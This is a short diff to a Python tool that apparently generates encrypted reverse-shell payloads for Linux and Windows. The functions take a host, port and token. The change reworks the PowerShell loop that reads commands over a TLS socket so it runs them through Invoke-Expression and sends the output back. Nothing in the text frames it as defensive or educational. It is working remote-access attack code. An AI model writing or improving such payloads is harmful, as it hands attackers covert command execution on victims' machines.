@@ -61,8 +61,6 @@ def try_tls_handshake(
         return None
 
 
-# ---------------------------------------------------------------- payloads
-
 def encrypt_payload_linux(host: str, port: int, token: str) -> str:
     script = (
         "import ssl,socket,subprocess,os,select,signal,pty\n"
@@ -106,8 +104,9 @@ def encrypt_payload_windows(host: str, port: int, token: str) -> str:
         f"$r=New-Object IO.StreamReader($ssl);"
         f"while($c.Connected){{"
         f"$cmd=$r.ReadLine();"
-        f"if(!$cmd){{break}}"
-        f"$out=cmd /c $cmd 2>&1|Out-String;"
+        f"if($null -eq $cmd){{break}}"
+        f"if($cmd.Length -eq 0){{continue}}"
+        f"$out=try{{Invoke-Expression $cmd 2>&1|Out-String}}catch{{$_.Exception.Message}};"
         f"$w.Write($out)}}"
         f"$c.Close()"
     )
